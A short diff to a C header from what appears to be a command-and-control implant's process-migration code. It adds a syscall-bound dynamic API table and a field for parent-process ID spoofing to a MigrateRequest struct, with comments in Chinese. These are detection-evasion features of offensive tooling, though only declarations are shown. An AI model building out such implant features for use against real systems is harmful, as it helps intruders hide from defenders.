@@ -19,6 +19,8 @@ typedef struct MigrateRequest {
     CHAR spawn_path[MAX_PATH];
     CHAR spawn_args[MIGRATE_CMDLINE_MAX];
     ByteBuf stage;
+    const Win32Api* api;             /* 动态 API 表（syscall 绑定后的槽位） */
+    UINT32 ppid;                     /* PPID 欺骗目标；0 = 用全局 spawn_ppid 配置 */
 } MigrateRequest;
 
 ByteBuf MigrateHandle(BeaconContext* ctx, UINT32 task_id, Parser* parser);
